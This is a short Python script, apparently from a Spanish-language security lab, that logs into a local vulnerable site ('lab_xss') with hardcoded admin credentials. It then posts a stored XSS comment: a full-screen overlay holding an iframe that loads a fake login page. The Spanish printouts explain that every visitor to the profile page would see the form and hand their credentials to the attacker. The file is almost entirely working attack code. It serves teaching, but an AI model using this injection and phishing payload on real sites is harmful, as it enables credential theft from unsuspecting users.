import requests

login_url = "http://localhost/lab_xss/index.php"
profile_url = "http://localhost/lab_xss/profile.php"
login_payload = {
    'username': 'admin',
    'password': 'password123'
}

session = requests.Session()

print("--- Explicación del Ataque XSS Almacenado ---")
print("1. El atacante inicia sesión en el sitio para poder publicar un comentario.")

try:
    response = session.post(login_url, data=login_payload)

    if "profile.php" in response.url or response.status_code == 302:
        print("Login exitoso.")

        attacker_fake_login_url = "http://localhost/lab_xss/fake_login.html"
        
        payload = f'<div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.5); z-index:9999; display:flex; justify-content:center; align-items:center;"><iframe src="{attacker_fake_login_url}" style="border:none; width:400px; height:300px;"></iframe></div>'
        comment_payload = {'comment': payload}

        print("2. El atacante publica el comentario malicioso.")
        
        response = session.post(profile_url, data=comment_payload)
        
        if response.status_code == 200:
            print(" Comentario malicioso publicado con éxito.")
            print("\n¿Qué pasa ahora?")
            print(" - El payload se ha guardado en la base de datos.")
            print(" - CUALQUIER USUARIO (incluido el admin) que visite profile.php verá el formulario fijo.")
            print(" - Si intentan iniciar sesión, sus credenciales serán enviadas al atacante.")
        else:
            print(f"Error al publicar el comentario. Código de estado: {response.status_code}")
            print("Respuesta del servidor:", response.text)
    else:
        print("Falló el login al sitio vulnerable. Revisa las credenciales o la URL.")
        print("Código de estado:", response.status_code)

except requests.exceptions.RequestException as e:
    print(f"Ocurrió un error de conexión: {e}")
